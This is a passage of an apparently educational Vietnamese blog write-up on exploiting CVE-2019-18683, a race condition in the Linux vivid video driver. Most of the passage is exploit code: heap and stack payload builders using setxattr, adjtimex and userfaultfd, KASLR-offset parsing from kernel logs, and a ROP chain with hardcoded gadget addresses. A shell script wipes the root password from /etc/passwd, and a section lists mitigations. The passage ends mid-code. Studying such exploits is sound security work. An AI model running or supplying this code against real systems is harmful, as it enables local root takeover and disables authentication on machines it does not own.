Oke, đã hiểu, chúng ta có barrier là rào cản, khi đủ thread thì nó sẽ mở cửa, vậy làm sao mình quản lí được khi nào cần 2 thread, khi nào cần 44 thread? Đơn giản chúng ta dự vào function, và đặt barrier vào cuối những function trên. Good, Tôi đã hiểu được đoạn này và đã có idea tiếp tục làm.</li>
</ul>
<h3 id="anatomy-of-the-exploit-payload">Anatomy of the exploit payload</h3>
<ul>
<li>Payload sẽ được tạo ở 2 nơi:</li>
</ul>
<ol>
<li>Trong <code>kernel heap</code> bằng <code>sprayer threads</code> bằng cách sử dụng hàm <code>setxattr()</code> được xử lí bởi <code>userfaultfd()</code></li>
<li>Trong <code>kernel stack</code> bằng <code>racer threads</code> bằng cách sử dụng <code>adjtimex()</code> được xử lí bởi <code>userfaultfd()</code>. System call này được chọn vì nó có gọi hàm <code>copy_from_user()</code> tới kernel stack.</li>
</ol>
<ul>
<li>Payload gồm 3 phần:</li>
</ul>
<ol>
<li><code>vb2_buffer</code> trong kernel heap.</li>
<li><code>vb2_queue</code> trong kernel stack.</li>
<li><code>vb2_mem_ops</code>: trong kernel stack.</li>
</ol>
<ul>
<li>Dưới đây là chương trình tạo payload. Bắt đầu phần khai thác, ta chuẩn bị nội dung của payload ở userspace, vùng nhớ được tạo bởi <code>setxattr()</code> syscall sẽ được đưa vào kernel heap.</li>
</ul>
<div class="highlight"><div class="chroma">
<table class="lntable"><tr><td class="lntd">
<pre class="chroma"><code><span class="lnt"> 1
</span><span class="lnt"> 2
</span><span class="lnt"> 3
</span><span class="lnt"> 4
</span><span class="lnt"> 5
</span><span class="lnt"> 6
</span><span class="lnt"> 7
</span><span class="lnt"> 8
</span><span class="lnt"> 9
</span><span class="lnt">10
</span><span class="lnt">11
</span><span class="lnt">12
</span><span class="lnt">13
</span><span class="lnt">14
</span><span class="lnt">15
</span><span class="lnt">16
</span><span class="lnt">17
</span><span class="lnt">18
</span><span class="lnt">19
</span><span class="lnt">20
</span><span class="lnt">21
</span><span class="lnt">22
</span><span class="lnt">23
</span><span class="lnt">24
</span><span class="lnt">25
</span><span class="lnt">26
</span><span class="lnt">27
</span><span class="lnt">28
</span><span class="lnt">29
</span><span class="lnt">30
</span><span class="lnt">31
</span><span class="lnt">32
</span></code></pre></td>
<td class="lntd">
<pre class="chroma"><code class="language-objectivec" data-lang="objectivec">
<span class="cp">#define MMAP_SZ 0x2000
</span><span class="cp">#define PAYLOAD_SZ 504
</span><span class="cp"></span>
<span class="kt">void</span> <span class="nf">init_heap_payload</span><span class="p">()</span>
<span class="p">{</span>
	<span class="k">struct</span> <span class="n">vivid_buffer</span> <span class="o">*</span><span class="n">vbuf</span> <span class="o">=</span> <span class="nb">NULL</span><span class="p">;</span>
	<span class="k">struct</span> <span class="n">vb2_plane</span> <span class="o">*</span><span class="n">vplane</span> <span class="o">=</span> <span class="nb">NULL</span><span class="p">;</span>

	<span class="n">for_heap</span> <span class="o">=</span> <span class="n">mmap</span><span class="p">(</span><span class="nb">NULL</span><span class="p">,</span> <span class="n">MMAP_SZ</span><span class="p">,</span> <span class="n">PROT_READ</span> <span class="o">|</span> <span class="n">PROT_WRITE</span><span class="p">,</span>
					<span class="n">MAP_SHARED</span> <span class="o">|</span> <span class="n">MAP_ANONYMOUS</span><span class="p">,</span> <span class="o">-</span><span class="mi">1</span><span class="p">,</span> <span class="mi">0</span><span class="p">);</span>
	<span class="k">if</span> <span class="p">(</span><span class="n">for_heap</span> <span class="o">==</span> <span class="n">MAP_FAILED</span><span class="p">)</span>
		<span class="n">err_exit</span><span class="p">(</span><span class="s">&#34;[-] mmap&#34;</span><span class="p">);</span>

	<span class="n">printf</span><span class="p">(</span><span class="s">&#34; [+] payload for_heap is mmaped to %p</span><span class="se">\n</span><span class="s">&#34;</span><span class="p">,</span> <span class="n">for_heap</span><span class="p">);</span>

	<span class="cm">/* Don&#39;t touch the second page (needed for userfaultfd) */</span>
	<span class="n">memset</span><span class="p">(</span><span class="n">for_heap</span><span class="p">,</span> <span class="mi">0</span><span class="p">,</span> <span class="n">PAGE_SIZE</span><span class="p">);</span>

	<span class="n">xattr_addr</span> <span class="o">=</span> <span class="n">for_heap</span> <span class="o">+</span> <span class="n">PAGE_SIZE</span> <span class="o">-</span> <span class="n">PAYLOAD_SZ</span><span class="p">;</span>

	<span class="n">vbuf</span> <span class="o">=</span> <span class="p">(</span><span class="k">struct</span> <span class="n">vivid_buffer</span> <span class="o">*</span><span class="p">)</span><span class="n">xattr_addr</span><span class="p">;</span>

	<span class="n">vbuf</span><span class="o">-&gt;</span><span class="n">vb</span><span class="p">.</span><span class="n">vb2_buf</span><span class="p">.</span><span class="n">num_planes</span> <span class="o">=</span> <span class="mi">1</span><span class="p">;</span>
	<span class="n">vplane</span> <span class="o">=</span> <span class="n">vbuf</span><span class="o">-&gt;</span><span class="n">vb</span><span class="p">.</span><span class="n">vb2_buf</span><span class="p">.</span><span class="n">planes</span><span class="p">;</span>
	<span class="n">vplane</span><span class="o">-&gt;</span><span class="n">bytesused</span> <span class="o">=</span> <span class="mi">16</span><span class="p">;</span>
	<span class="n">vplane</span><span class="o">-&gt;</span><span class="n">length</span> <span class="o">=</span> <span class="mi">16</span><span class="p">;</span>
	<span class="n">vplane</span><span class="o">-&gt;</span><span class="n">min_length</span> <span class="o">=</span> <span class="mi">16</span><span class="p">;</span>

	<span class="n">printf</span><span class="p">(</span><span class="s">&#34; [+] vivid_buffer of size %lu is at %p</span><span class="se">\n</span><span class="s">&#34;</span><span class="p">,</span>
					<span class="k">sizeof</span><span class="p">(</span><span class="k">struct</span> <span class="n">vivid_buffer</span><span class="p">),</span> <span class="n">vbuf</span><span class="p">);</span>
<span class="p">}</span>
</code></pre></td></tr></table>
</div>
</div><ul>
<li><code>adjtimex() syscall</code> ghi dữ liệu vào kernel stack</li>
</ul>
<div class="highlight"><div class="chroma">
<table class="lntable"><tr><td class="lntd">
<pre class="chroma"><code><span class="lnt"> 1
</span><span class="lnt"> 2
</span><span class="lnt"> 3
</span><span class="lnt"> 4
</span><span class="lnt"> 5
</span><span class="lnt"> 6
</span><span class="lnt"> 7
</span><span class="lnt"> 8
</span><span class="lnt"> 9
</span><span class="lnt">10
</span><span class="lnt">11
</span><span class="lnt">12
</span><span class="lnt">13
</span><span class="lnt">14
</span><span class="lnt">15
</span><span class="lnt">16
</span><span class="lnt">17
</span><span class="lnt">18
</span></code></pre></td>
<td class="lntd">
<pre class="chroma"><code class="language-objectivec" data-lang="objectivec"><span class="cp">#define PAYLOAD2_SZ 208
</span><span class="cp"></span>
<span class="kt">void</span> <span class="nf">init_stack_payload</span><span class="p">()</span>
<span class="p">{</span>
	<span class="n">for_stack</span> <span class="o">=</span> <span class="n">mmap</span><span class="p">(</span><span class="nb">NULL</span><span class="p">,</span> <span class="n">MMAP_SZ</span><span class="p">,</span> <span class="n">PROT_READ</span> <span class="o">|</span> <span class="n">PROT_WRITE</span><span class="p">,</span>
					<span class="n">MAP_SHARED</span> <span class="o">|</span> <span class="n">MAP_ANONYMOUS</span><span class="p">,</span> <span class="o">-</span><span class="mi">1</span><span class="p">,</span> <span class="mi">0</span><span class="p">);</span>
	<span class="k">if</span> <span class="p">(</span><span class="n">for_stack</span> <span class="o">==</span> <span class="n">MAP_FAILED</span><span class="p">)</span>
		<span class="n">err_exit</span><span class="p">(</span><span class="s">&#34;[-] mmap&#34;</span><span class="p">);</span>

	<span class="n">printf</span><span class="p">(</span><span class="s">&#34; [+] payload for_stack is mmaped to %p</span><span class="se">\n</span><span class="s">&#34;</span><span class="p">,</span> <span class="n">for_stack</span><span class="p">);</span>

	<span class="cm">/* Don&#39;t touch the second page (needed for userfaultfd) */</span>
	<span class="n">memset</span><span class="p">(</span><span class="n">for_stack</span><span class="p">,</span> <span class="mi">0</span><span class="p">,</span> <span class="n">PAGE_SIZE</span><span class="p">);</span>

	<span class="n">timex_addr</span> <span class="o">=</span> <span class="n">for_stack</span> <span class="o">+</span> <span class="n">PAGE_SIZE</span> <span class="o">-</span> <span class="n">PAYLOAD2_SZ</span> <span class="o">+</span> <span class="mi">8</span><span class="p">;</span>
	<span class="n">printf</span><span class="p">(</span><span class="s">&#34; [+] timex of size %lu is at %p</span><span class="se">\n</span><span class="s">&#34;</span><span class="p">,</span>
				<span class="k">sizeof</span><span class="p">(</span><span class="k">struct</span> <span class="n">timex</span><span class="p">),</span> <span class="n">timex_addr</span><span class="p">);</span>
<span class="p">}</span>
</code></pre></td></tr></table>
</div>
</div><ul>
<li>Sau khi bị race condition, pthread sẽ phân tích cú pháp của <code>kmsg</code>, trích xuất thông tin từ kernel warning:
<ul>
<li>Giá trị <code>RSP</code> để tính địa chỉ đỉnh của kernel stack</li>
<li>Giá trị <code>R11</code> trỏ đến một số vị trí không đổi trong kernel code. Giá trị này giúp tính toán offset của <code>KASLR</code>.</li>
</ul>
</li>
</ul>
<div class="highlight"><div class="chroma">
<table class="lntable"><tr><td class="lntd">
<pre class="chroma"><code><span class="lnt"> 1
</span><span class="lnt"> 2
</span><span class="lnt"> 3
</span><span class="lnt"> 4
</span><span class="lnt"> 5
</span><span class="lnt"> 6
</span><span class="lnt"> 7
</span><span class="lnt"> 8
</span><span class="lnt"> 9
</span><span class="lnt">10
</span></code></pre></td>
<td class="lntd">
<pre class="chroma"><code class="language-objectivec" data-lang="objectivec"><span class="cp">#define R11_COMPONENT_TO_KASLR_OFFSET 0x195d80d
</span><span class="cp">#define KERNEL_TEXT_BASE 0xffffffff81000000
</span><span class="cp"></span>
<span class="n">kaslr_offset</span> <span class="o">=</span> <span class="n">strtoul</span><span class="p">(</span><span class="n">r11</span><span class="p">,</span> <span class="nb">NULL</span><span class="p">,</span> <span class="mi">16</span><span class="p">);</span>
<span class="n">kaslr_offset</span> <span class="o">-=</span> <span class="n">R11_COMPONENT_TO_KASLR_OFFSET</span><span class="p">;</span>
<span class="k">if</span> <span class="p">(</span><span class="n">kaslr_offset</span> <span class="o">&lt;</span> <span class="n">KERNEL_TEXT_BASE</span><span class="p">)</span> <span class="p">{</span>
    <span class="n">printf</span><span class="p">(</span><span class="s">&#34;bad kernel text base 0x%lx</span><span class="se">\n</span><span class="s">&#34;</span><span class="p">,</span> <span class="n">kaslr_offset</span><span class="p">);</span>
    <span class="n">err_exit</span><span class="p">(</span><span class="s">&#34;[-] kmsg parsing for r11&#34;</span><span class="p">);</span>
<span class="p">}</span>
<span class="n">kaslr_offset</span> <span class="o">-=</span> <span class="n">KERNEL_TEXT_BASE</span><span class="p">;</span>
</code></pre></td></tr></table>
</div>
</div><ul>
<li>Sau đó, pthread phân tích cú pháp của <code>kmsg</code>, điều chỉnh payload trên heap và stack.</li>
</ul>
<div class="highlight"><div class="chroma">
<table class="lntable"><tr><td class="lntd">
<pre class="chroma"><code><span class="lnt"> 1
</span><span class="lnt"> 2
</span><span class="lnt"> 3
</span><span class="lnt"> 4
</span><span class="lnt"> 5
</span><span class="lnt"> 6
</span><span class="lnt"> 7
</span><span class="lnt"> 8
</span><span class="lnt"> 9
</span><span class="lnt">10
</span><span class="lnt">11
</span><span class="lnt">12
</span><span class="lnt">13
</span><span class="lnt">14
</span><span class="lnt">15
</span><span class="lnt">16
</span><span class="lnt">17
</span><span class="lnt">18
</span><span class="lnt">19
</span><span class="lnt">20
</span><span class="lnt">21
</span><span class="lnt">22
</span><span class="lnt">23
</span><span class="lnt">24
</span><span class="lnt">25
</span><span class="lnt">26
</span><span class="lnt">27
</span><span class="lnt">28
</span><span class="lnt">29
</span><span class="lnt">30
</span><span class="lnt">31
</span><span class="lnt">32
</span><span class="lnt">33
</span><span class="lnt">34
</span><span class="lnt">35
</span><span class="lnt">36
</span><span class="lnt">37
</span><span class="lnt">38
</span><span class="lnt">39
</span><span class="lnt">40
</span><span class="lnt">41
</span><span class="lnt">42
</span><span class="lnt">43
</span><span class="lnt">44
</span><span class="lnt">45
</span><span class="lnt">46
</span></code></pre></td>
<td class="lntd">
<pre class="chroma"><code class="language-objectivec" data-lang="objectivec">	<span class="cp">#define TIMEX_STACK_OFFSET 0x1d0
</span><span class="cp"></span>	<span class="cp">#define LIST_OFFSET 24
</span><span class="cp"></span>	<span class="cp">#define OPS_OFFSET 64
</span><span class="cp"></span>	<span class="cp">#define CMD_OFFSET 172
</span><span class="cp"></span>
	<span class="k">struct</span> <span class="n">vivid_buffer</span> <span class="o">*</span><span class="n">vbuf</span> <span class="o">=</span> <span class="p">(</span><span class="k">struct</span> <span class="n">vivid_buffer</span> <span class="o">*</span><span class="p">)</span><span class="n">xattr_addr</span><span class="p">;</span>
	<span class="k">struct</span> <span class="n">vb2_queue</span> <span class="o">*</span><span class="n">vq</span> <span class="o">=</span> <span class="nb">NULL</span><span class="p">;</span>
	<span class="k">struct</span> <span class="n">vb2_mem_ops</span> <span class="o">*</span><span class="n">memops</span> <span class="o">=</span> <span class="nb">NULL</span><span class="p">;</span>
	<span class="k">struct</span> <span class="n">vb2_plane</span> <span class="o">*</span><span class="n">vplane</span> <span class="o">=</span> <span class="nb">NULL</span><span class="p">;</span>

	<span class="n">printf</span><span class="p">(</span><span class="s">&#34;Adapt payloads knowing that kstack is 0x%lx, kaslr_offset 0x%lx:</span><span class="se">\n</span><span class="s">&#34;</span><span class="p">,</span>
		<span class="n">kstack</span><span class="p">,</span>
		<span class="n">kaslr_offset</span><span class="p">);</span>

	<span class="cm">/* point to future position of vb2_queue in timex payload on kernel stack */</span>
	<span class="n">vbuf</span><span class="o">-&gt;</span><span class="n">vb</span><span class="p">.</span><span class="n">vb2_buf</span><span class="p">.</span><span class="n">vb2_queue</span> <span class="o">=</span> <span class="p">(</span><span class="k">struct</span> <span class="n">vb2_queue</span> <span class="o">*</span><span class="p">)(</span><span class="n">kstack</span> <span class="o">-</span> <span class="n">TIMEX_STACK_OFFSET</span><span class="p">);</span>
	<span class="n">vq</span> <span class="o">=</span> <span class="p">(</span><span class="k">struct</span> <span class="n">vb2_queue</span> <span class="o">*</span><span class="p">)</span><span class="n">timex_addr</span><span class="p">;</span>
	<span class="n">printf</span><span class="p">(</span><span class="s">&#34;   vb2_queue of size %lu will be at %p, userspace %p</span><span class="se">\n</span><span class="s">&#34;</span><span class="p">,</span>
		<span class="k">sizeof</span><span class="p">(</span><span class="k">struct</span> <span class="n">vb2_queue</span><span class="p">),</span>
		<span class="n">vbuf</span><span class="o">-&gt;</span><span class="n">vb</span><span class="p">.</span><span class="n">vb2_buf</span><span class="p">.</span><span class="n">vb2_queue</span><span class="p">,</span>
		<span class="n">vq</span><span class="p">);</span>

	<span class="cm">/* just to survive vivid list operations */</span>
	<span class="n">vbuf</span><span class="o">-&gt;</span><span class="n">list</span><span class="p">.</span><span class="n">next</span> <span class="o">=</span> <span class="p">(</span><span class="k">struct</span> <span class="n">list_head</span> <span class="o">*</span><span class="p">)(</span><span class="n">kstack</span> <span class="o">-</span> <span class="n">TIMEX_STACK_OFFSET</span> <span class="o">+</span> <span class="n">LIST_OFFSET</span><span class="p">);</span>
	<span class="n">vbuf</span><span class="o">-&gt;</span><span class="n">list</span><span class="p">.</span><span class="n">prev</span> <span class="o">=</span> <span class="p">(</span><span class="k">struct</span> <span class="n">list_head</span> <span class="o">*</span><span class="p">)(</span><span class="n">kstack</span> <span class="o">-</span> <span class="n">TIMEX_STACK_OFFSET</span> <span class="o">+</span> <span class="n">LIST_OFFSET</span><span class="p">);</span>

	<span class="cm">/*
</span><span class="cm">	* point to future position of vb2_mem_ops in timex payload on kernel stack;
</span><span class="cm">	* mem_ops offset is 0x38, be careful with OPS_OFFSET
</span><span class="cm">	*/</span>
	<span class="n">vq</span><span class="o">-&gt;</span><span class="n">mem_ops</span> <span class="o">=</span> <span class="p">(</span><span class="k">struct</span> <span class="n">vb2_mem_ops</span> <span class="o">*</span><span class="p">)(</span><span class="n">kstack</span> <span class="o">-</span> <span class="n">TIMEX_STACK_OFFSET</span> <span class="o">+</span> <span class="n">OPS_OFFSET</span><span class="p">);</span>
	<span class="n">printf</span><span class="p">(</span><span class="s">&#34;   mem_ops ptr will be at %p, userspace %p, value %p</span><span class="se">\n</span><span class="s">&#34;</span><span class="p">,</span>
		<span class="o">&amp;</span><span class="p">(</span><span class="n">vbuf</span><span class="o">-&gt;</span><span class="n">vb</span><span class="p">.</span><span class="n">vb2_buf</span><span class="p">.</span><span class="n">vb2_queue</span><span class="o">-&gt;</span><span class="n">mem_ops</span><span class="p">),</span>
		<span class="o">&amp;</span><span class="p">(</span><span class="n">vq</span><span class="o">-&gt;</span><span class="n">mem_ops</span><span class="p">),</span>
		<span class="n">vq</span><span class="o">-&gt;</span><span class="n">mem_ops</span><span class="p">);</span>

	<span class="n">memops</span> <span class="o">=</span> <span class="p">(</span><span class="k">struct</span> <span class="n">vb2_mem_ops</span> <span class="o">*</span><span class="p">)(</span><span class="n">timex_addr</span> <span class="o">+</span> <span class="n">OPS_OFFSET</span><span class="p">);</span>

	<span class="cm">/* vaddr offset is 0x58, be careful with ROP_CHAIN_OFFSET */</span>
	<span class="n">memops</span><span class="o">-&gt;</span><span class="n">vaddr</span> <span class="o">=</span> <span class="p">(</span><span class="kt">void</span> <span class="o">*</span><span class="p">)</span><span class="n">ROP__PUSH_RDI__POP_RSP__pop_rbp__or_eax_edx__RET</span> <span class="o">+</span> <span class="n">kaslr_offset</span><span class="p">;</span>
	<span class="n">printf</span><span class="p">(</span><span class="s">&#34;   mem_ops struct of size %lu will be at %p, userspace %p, vaddr %p at %p</span><span class="se">\n</span><span class="s">&#34;</span><span class="p">,</span>
		<span class="k">sizeof</span><span class="p">(</span><span class="k">struct</span> <span class="n">vb2_mem_ops</span><span class="p">),</span>
		<span class="n">vq</span><span class="o">-&gt;</span><span class="n">mem_ops</span><span class="p">,</span>
		<span class="n">memops</span><span class="p">,</span>
		<span class="n">memops</span><span class="o">-&gt;</span><span class="n">vaddr</span><span class="p">,</span>
		<span class="o">&amp;</span><span class="p">(</span><span class="n">memops</span><span class="o">-&gt;</span><span class="n">vaddr</span><span class="p">));</span>
</code></pre></td></tr></table>
</div>
</div><p>Lược đồ thể hiện mối quan hệ giữa các thành phần bên trong kernel memory.<br />
<img src="/images/posts/CVE-2019-18683/v4l2_payload.png" alt="v4l2_payload.png" /><br />
<div class="notices warning" data-title="Warning">
  <em>Chưa thực sự hiểu lược đồ</em>
</div></p>
<h3 id="ropnjop">ROP&rsquo;n&rsquo;JOP</h3>
<ul>
<li>Tiếp theo sẽ tạo ra ROP chain để khai thác lỗi.<br />
Từ lược đồ, có thể thấy <code>void *(*vaddr)(void *buf_priv)</code> là nơi chúng ta kiểm soát luồng thực thi để tấn công. Tham số <code>buf_priv</code> được lấy từ <code>vb2_plane.mem_priv</code> và giá trị này thuộc quyền kiểm soát của chúng ta.</li>
<li>Trong linux kernel x86_64, tham số đầu của hàm sẽ được lưu trong thanh ghi <code>RDI</code>, Vì thế chuỗi lệnh <code>push rdi; pop rsp</code> sẽ đưa stack pointer tới nơi mà chúng ta muốn <code>RDI</code>.</li>
<li>Tiêp theo <code>ROP chain</code> cho mục đích leo thang đặc quyền:</li>
</ul>
<div class="highlight"><div class="chroma">
<table class="lntable"><tr><td class="lntd">
<pre class="chroma"><code><span class="lnt"> 1
</span><span class="lnt"> 2
</span><span class="lnt"> 3
</span><span class="lnt"> 4
</span><span class="lnt"> 5
</span><span class="lnt"> 6
</span><span class="lnt"> 7
</span><span class="lnt"> 8
</span><span class="lnt"> 9
</span><span class="lnt">10
</span><span class="lnt">11
</span><span class="lnt">12
</span><span class="lnt">13
</span><span class="lnt">14
</span><span class="lnt">15
</span><span class="lnt">16
</span><span class="lnt">17
</span><span class="lnt">18
</span><span class="lnt">19
</span><span class="lnt">20
</span><span class="lnt">21
</span><span class="lnt">22
</span><span class="lnt">23
</span><span class="lnt">24
</span><span class="lnt">25
</span><span class="lnt">26
</span><span class="lnt">27
</span><span class="lnt">28
</span><span class="lnt">29
</span><span class="lnt">30
</span><span class="lnt">31
</span><span class="lnt">32
</span><span class="lnt">33
</span><span class="lnt">34
</span><span class="lnt">35
</span></code></pre></td>
<td class="lntd">
<pre class="chroma"><code class="language-objectivec" data-lang="objectivec"><span class="cp">#define ROP__PUSH_RDI__POP_RSP__pop_rbp__or_eax_edx__RET 0xffffffff814725f1
</span><span class="cp">#define ROP__POP_R15__RET 0xffffffff81084ecf
</span><span class="cp">#define ROP__POP_RDI__RET 0xffffffff8101ef05
</span><span class="cp">#define ROP__JMP_R15 0xffffffff81c071be
</span><span class="cp">#define ADDR_RUN_CMD 0xffffffff810b4ed0
</span><span class="cp">#define ADDR_DO_TASK_DEAD 0xffffffff810bf260
</span><span class="cp"></span>
<span class="kt">unsigned</span> <span class="kt">long</span> <span class="o">*</span><span class="n">rop</span> <span class="o">=</span> <span class="nb">NULL</span><span class="p">;</span>
<span class="kt">char</span> <span class="o">*</span><span class="n">cmd</span> <span class="o">=</span> <span class="s">&#34;/bin/sh /home/a13x/pwn&#34;</span><span class="p">;</span> <span class="cm">/* rewrites /etc/passwd to drop root password */</span>
<span class="n">size_t</span> <span class="n">cmdlen</span> <span class="o">=</span> <span class="n">strlen</span><span class="p">(</span><span class="n">cmd</span><span class="p">)</span> <span class="o">+</span> <span class="mi">1</span><span class="p">;</span> <span class="cm">/* for 0 byte */</span>

<span class="cm">/* mem_priv is the arg for vaddr() */</span>
<span class="n">vplane</span> <span class="o">=</span> <span class="n">vbuf</span><span class="o">-&gt;</span><span class="n">vb</span><span class="p">.</span><span class="n">vb2_buf</span><span class="p">.</span><span class="n">planes</span><span class="p">;</span>
<span class="n">vplane</span><span class="o">-&gt;</span><span class="n">mem_priv</span> <span class="o">=</span> <span class="p">(</span><span class="kt">void</span> <span class="o">*</span><span class="p">)(</span><span class="n">kstack</span> <span class="o">-</span> <span class="n">TIMEX_STACK_OFFSET</span> <span class="o">+</span> <span class="n">ROP_CHAIN_OFFSET</span><span class="p">);</span>

<span class="n">rop</span> <span class="o">=</span> <span class="p">(</span><span class="kt">unsigned</span> <span class="kt">long</span> <span class="o">*</span><span class="p">)(</span><span class="n">timex_addr</span> <span class="o">+</span> <span class="n">ROP_CHAIN_OFFSET</span><span class="p">);</span>
<span class="n">printf</span><span class="p">(</span><span class="s">&#34;   rop chain will be at %p, userspace %p</span><span class="se">\n</span><span class="s">&#34;</span><span class="p">,</span> <span class="n">vplane</span><span class="o">-&gt;</span><span class="n">mem_priv</span><span class="p">,</span> <span class="n">rop</span><span class="p">);</span>

<span class="n">strncpy</span><span class="p">((</span><span class="kt">char</span> <span class="o">*</span><span class="p">)</span><span class="n">timex_addr</span> <span class="o">+</span> <span class="n">CMD_OFFSET</span><span class="p">,</span> <span class="n">cmd</span><span class="p">,</span> <span class="n">cmdlen</span><span class="p">);</span>
<span class="n">printf</span><span class="p">(</span><span class="s">&#34;   cmd will be at %lx, userspace %p</span><span class="se">\n</span><span class="s">&#34;</span><span class="p">,</span>
	<span class="p">(</span><span class="n">kstack</span> <span class="o">-</span> <span class="n">TIMEX_STACK_OFFSET</span> <span class="o">+</span> <span class="n">CMD_OFFSET</span><span class="p">),</span>
	<span class="p">(</span><span class="kt">char</span> <span class="o">*</span><span class="p">)</span><span class="n">timex_addr</span> <span class="o">+</span> <span class="n">CMD_OFFSET</span><span class="p">);</span>

<span class="cm">/* stack will be trashed near rop chain, be careful with CMD_OFFSET */</span>
<span class="o">*</span><span class="n">rop</span><span class="o">++</span> <span class="o">=</span> <span class="mh">0x1337133713371337</span><span class="p">;</span> <span class="cm">/* placeholder for pop rbp in the pivoting gadget */</span>
<span class="o">*</span><span class="n">rop</span><span class="o">++</span> <span class="o">=</span> <span class="n">ROP__POP_R15__RET</span> <span class="o">+</span> <span class="n">kaslr_offset</span><span class="p">;</span>
<span class="o">*</span><span class="n">rop</span><span class="o">++</span> <span class="o">=</span> <span class="n">ADDR_RUN_CMD</span> <span class="o">+</span> <span class="n">kaslr_offset</span><span class="p">;</span>
<span class="o">*</span><span class="n">rop</span><span class="o">++</span> <span class="o">=</span> <span class="n">ROP__POP_RDI__RET</span> <span class="o">+</span> <span class="n">kaslr_offset</span><span class="p">;</span>
<span class="o">*</span><span class="n">rop</span><span class="o">++</span> <span class="o">=</span> <span class="p">(</span><span class="kt">unsigned</span> <span class="kt">long</span><span class="p">)(</span><span class="n">kstack</span> <span class="o">-</span> <span class="n">TIMEX_STACK_OFFSET</span> <span class="o">+</span> <span class="n">CMD_OFFSET</span><span class="p">);</span>
<span class="o">*</span><span class="n">rop</span><span class="o">++</span> <span class="o">=</span> <span class="n">ROP__JMP_R15</span> <span class="o">+</span> <span class="n">kaslr_offset</span><span class="p">;</span>
<span class="o">*</span><span class="n">rop</span><span class="o">++</span> <span class="o">=</span> <span class="n">ROP__POP_R15__RET</span> <span class="o">+</span> <span class="n">kaslr_offset</span><span class="p">;</span>
<span class="o">*</span><span class="n">rop</span><span class="o">++</span> <span class="o">=</span> <span class="n">ADDR_DO_TASK_DEAD</span> <span class="o">+</span> <span class="n">kaslr_offset</span><span class="p">;</span>
<span class="o">*</span><span class="n">rop</span><span class="o">++</span> <span class="o">=</span> <span class="n">ROP__JMP_R15</span> <span class="o">+</span> <span class="n">kaslr_offset</span><span class="p">;</span>

<span class="n">printf</span><span class="p">(</span><span class="s">&#34; [+] the payload for kernel heap and stack is ready. Put it.</span><span class="se">\n</span><span class="s">&#34;</span><span class="p">);</span>
</code></pre></td></tr></table>
</div>
</div><h3 id="cách-thức-hoạt-động-của-rop-chain">Cách thức hoạt động của ROP chain</h3>
<ol>
<li><code>ROP chain</code> đưa địa chỉ của hàm <code>run_cmd()</code> từ <code>kernel/reboot.c</code> vào thanh ghi <code>R15</code>.</li>
<li>Lưu địa chỉ của lệnh shell vào thanh ghi <code>RDI</code>. Địa chỉ này sẽ lưu tham số của hàm <code>run_cmd()</code>.</li>
<li>Chương trình sẽ nhảy tới <code>run_cmd()</code> để thực thi <code>/bin/sh /home/edisc/pwn</code> với quyền root. Đoạn mã này sẽ viết lại <code>/etc/passwd</code> cho phép chúng ta đăng nhập với quyền root mà không cần password.</li>
</ol>
<div class="highlight"><div class="chroma">
<table class="lntable"><tr><td class="lntd">
<pre class="chroma"><code><span class="lnt">1
</span><span class="lnt">2
</span><span class="lnt">3
</span></code></pre></td>
<td class="lntd">
<pre class="chroma"><code class="language-bash" data-lang="bash"><span class="cp">#!/bin/sh
</span><span class="cp"></span><span class="c1"># drop root password</span>
sed -i <span class="s1">&#39;1s/.*/root::0:0:root:\/root:\/bin\/bash/&#39;</span> /etc/passwd
</code></pre></td></tr></table>
</div>
</div><ol start="4">
<li>ROP chain nhảy tới <code>__noreturn_do_task_dead()</code> trong <code>kernel/exit.c</code>. Thao tác này nhằm tránh trường hợp kthread hiện tại không dừng, nó sẽ làm kernel crash - chúng ta không muốn điều đó.</li>
</ol>
<h2 id="một-số-ảnh-hưởng-tới-việc-khai-thác">Một số ảnh hưởng tới việc khai thác</h2>
<p>Có mốt số tính năng của kernel có thể ảnh hưởng tới việc khai thác của chúng ta:</p>
<ol>
<li>Thiết lập <code>/proc/sys/vm/unprivileged_userfaultfd</code> vê <code>0</code> sẽ không cho phép payload được lưu trong kernel. Việc này gây ra hạn chế, <code>userfaultfd()</code> chỉ hoạt động bởi <code>privileged users</code> (với <code>SYS_CAP_PTRACE</code> capability).</li>
<li>Thiết lập <code>kernel.dmesg_restrict</code> sysctl về  <code>1</code> sẽ chặn rò rỉ thông tin qua <code>kernel log</code>. VIệc này hạn chế người dùng đọc thông tin từ <code>kerbel syslog</code> qua <code>dmesg</code>. Tuy nhiên, dù cho <code>kernel.dmesg_restrict = 1</code>. Người dùng Ubuntu từ group <code>adm</code> vẫn có thể đọc kernel log từ <code>/var/log/syslog</code>.</li>
<li>Bản vá của <code>grsecurity/PaX</code> có một tính năng gọi là <code>PAX_RANDKSTACK</code> làm khó khăn cho việc đoán vị trí của <code>vb2_qeue</code>.</li>
<li><code>PAX_RAP</code> từ bản vá của <code>grsecurity/PaX</code> có thể chặn ROP/JOP chain mô tả ở trên.</li>
</ol>
<h2 id="poc-detail">poc detail</h2>
<p>Tiếp theo chúng ta tiến hành viết poc để khai thác lỗi trên</p>
<h3 id="môi-trường-thực-thi">Môi trường thực thi</h3>
<ul>
<li><a href="https://www.youtube.com/watch?v=2SdSiJTGKLM&amp;ab_channel=DorianDotSlash">qemu</a></li>
<li><a href="http://old-releases.ubuntu.com/releases/18.04.3/">ubuntu server 18.04.3</a></li>
<li><a href="https://zoomadmin.com/HowToInstall/UbuntuPackage/linux-tools-virtual-lts-vivid">How To Install &ldquo;linux-tools-virtual-lts-vivid&rdquo; Package on Ubuntu</a></li>
<li>Trong quá trình cài đặt và kiểm tra với lệnh <code>getfacl /dev/video0</code> có thể bạn sẽ bị lỗi vì thiêu thư mục <code>dev/video0</code>. <a href="https://askubuntu.com/questions/881305/is-there-any-way-ffmpeg-send-video-to-dev-video0-on-ubuntu/881341#881341">Bài viết này</a> giúp tôi giải quyết được vấn đề này.</li>
<li><a href="https://www.programmersought.com/article/7010851656/">Cài đặt KASAN để debug</a></li>
</ul>
<h3 id="init-and-start-setxattr_userfaltfd_monitor-adjtimex_userfaultfd_monitor">Init and start setxattr_userfaltfd_monitor, adjtimex_userfaultfd_monitor</h3>
<ul>
<li>Chúng ta tiến hành tạo và chạy setxattr_userfaultfd và adjtimex_userfaultfd để giám sát và xử lí lỗi pagefault</li>
</ul>
<div class="highlight"><div class="chroma">
<table class="lntable"><tr><td class="lntd">
<pre class="chroma"><code><span class="lnt"> 1
</span><span class="lnt"> 2
</span><span class="lnt"> 3
</span><span class="lnt"> 4
</span><span class="lnt"> 5
</span><span class="lnt"> 6
</span><span class="lnt"> 7
